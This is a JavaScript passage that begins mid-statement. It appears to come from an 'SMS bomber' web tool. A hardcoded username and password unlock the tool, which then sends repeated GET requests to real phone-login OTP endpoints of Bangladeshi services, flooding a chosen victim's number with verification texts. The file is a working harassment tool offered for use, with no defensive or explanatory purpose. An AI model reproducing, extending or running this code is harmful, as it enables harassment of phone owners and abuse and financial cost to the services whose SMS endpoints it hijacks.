document.getElementById("username").value;
    const password = document.getElementById("password").value;
    if (username === "RAIHAN" && password === "LAMIA") {
        alert("LOGIN SUCCESSFUL! JOIN MY FACEBOOK GROUP");
        window.open("https://www.facebook.com/groups/452215046996439/?ref=share");
        document.querySelector(".login").style.display = "none";
        document.querySelector(".bombing").style.display = "block";
    } else {
        alert("Invalid User or Pass\nContact Admin For User And Pass");
        window.open("https://www.facebook.com/profile.php?id=100003472256152&mibextid=ZbWKwL");
    }
}

async function startBombing() {
    const number = document.getElementById("number").value;
    const amount = parseInt(document.getElementById("amount").value);
    const output = document.getElementById("output");
    output.innerHTML = "";

    const urls = [
        `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0${number}`,
        `https://www.bioscopelive.com/en/login/send-otp?phone=880${number}&operator=bd-otp`,
        // আরও URL যোগ করা যেতে পারে, আমি সংক্ষেপে রাখছি
    ];

    for (let i = 0; i < amount; i++) {
        for (let url of urls) {
            try {
                const response = await fetch(url, { method: "GET" });
                if (response.ok) {
                    output.innerHTML += `SMS SENT SUCCESSFULLY BY KING-14 - ${new Date().toLocaleTimeString()}<br>`;
                } else {
                    output.innerHTML += `Failed to send SMS - ${new Date().toLocaleTimeString()}<br>`;
                }
            } catch (error) {
                output.innerHTML += `Error: ${error.message} - ${new Date().toLocaleTimeString()}<br>`;
            }
        }
    }
}
